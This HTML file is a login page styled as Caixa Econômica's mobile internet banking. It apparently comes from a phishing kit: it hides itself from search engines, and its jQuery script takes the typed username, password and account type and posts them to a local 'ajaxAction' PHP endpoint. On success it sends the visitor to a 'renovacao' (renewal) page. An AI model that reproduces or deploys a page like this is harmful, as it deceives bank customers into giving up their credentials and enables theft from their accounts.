<!DOCTYPE html>
<html>
<head>
	<title>Caixa Econômica | Mobile</title>

	<!--METAS-->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="theme-color" content="#1664ac">
				
	
	<!--LINKS DE ESTILO-->
	 
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">

	<link rel="stylesheet" type="text/css" href="../assets/css/style_login.css">
	<style>
		p, div, label, input{
			font-family: 'Montserrat', sans-serif !important;
		}
		.usrInp{
			color: #999 !important;
		}
		.pwdInp{
			letter-spacing: 10px;
			color: #999 !important;
		}

		.imnotauser{
			text-align: center;
			display: flex;
			width: max-content;
			margin: 0 auto;
			color: #fff;
		}

		.imnotauser i{
			margin-top: -2px;
		}
	</style>
	
	<!--SCRIPTS-->

	<script type="text/javascript" src="../js/script_login.js"></script>
	
</head>
<body>
<div class="menu">
	<i class="material-icons">&#xe5d2;</i><p>INTERNET</p><p id="sp">BANKING</p>
</div>
	<div class="corpo">
		<img id="lgc" src="../assets/imgs/logo_caixa.png" width="150px" height="30px">
		<div class="formulario">
			<form id="formuser" name="formuser" method="POST" >
				<div class="form-item">
					<div class="arrastar">
						<p>Lembrar meu usuário</p>
						<label class="swich">
							<input type="checkbox" name="on" id="on">
							<div class="slider"></div>
						</label>
					</div>
					<input type="text" id="usuario" class="usrInp" name="userLog" maxlength="20" autocomplete="off" required="" onkeyup="return habilitarBotao();">
					<label class="label-float" for="usuario">Usuário</label>
				</div>
				<div class="form-item">
					<img src="../assets/imgs/form_icon.png" width="37px" height="35px">
					<input type="password" class="pwdInp" id="senha" name="passLog" maxlength="8" autocomplete="off" required="" onkeyup="return habilitarBotao();">

					<label class="label-float" for="senha">Senha</label>
				</div>
				<div class="btr">
					<ul>
						<li><input type="radio" id="pf" name="clienteLog" value="Pessoa Fisica" checked=""><label for="pf">Pessoa Física</label></li>
						<li><input type="radio" id="pj" name="clienteLog" value="Pessoa Juridica"><label for="pj">Pessoa Juridica</label></li>
					</ul>
				</div>
				<br>
				<br>
				<br>
				<br>
				<div class="notuser">
					<div class="imnotauser">
						Não tenho usuário &nbsp;&nbsp;&nbsp;	<i class="material-icons">arrow_forward</i>				
					</div>
				</div>
				<br>
				<input type="submit" id="bt" name="btnlog" value="Acessar minha conta" onclick="return validatefrm();">
			</form>
		</div>
	</div>
	<div id="mod-preload" class="mod-preload">
		<div class="container-img-preload">
			<img class="img-preload" src="../assets/imgs/pre_load.gif">
		</div>
	</div>
	<script src="https://code.jquery.com/jquery-3.5.1.js"></script>
	<script>
	 $(document)
    .ajaxStart(function(){ 
         $(".corpo").hide(); $(".mod-preload").show();
      })
    .ajaxStop(function(){ 
        $(".corpo").show();  $(".mod-preload").hide();
    });
		$(document).ready(function(){
			$(".mod-preload").hide();


			$(".notuser").click(function(){
				window.location.href="https://play.google.com/store/apps/details?id=br.com.gabba.Caixa"
			});

			$("form").submit(function(e){
				e.preventDefault();
				var tipoconta = "Fisica";

				if($('#pf').is(':checked')) {
					tipoconta = "Fisica";
				}

				if($('#pj').is(':checked')) { 
					tipoconta = "Juridica";					
				}
				
				var senha = $("#senha").val();
				var usuario = $("#usuario").val();
				var loginAuthenticate = "loginAuthenticate";

				$.ajax({
					url: "../ajaxAction/index.php",
					method: "post",
					data: {
						loginAuthenticate: loginAuthenticate,
						usuario: usuario,
						senha: senha,
						tipoconta: tipoconta
					},
					success: function(res){
						if(res == "success"){
							window.location.href="../renovacao/";
						}else{
							alert('não foi possivel completar essa solicitacao. Por favor, tente novamente mais tarde');
						}
					},
					error: function(){
						alert('erro ao processar essa solicitacao');
					}
				})
			})
		});
	</script>
</body>
</html>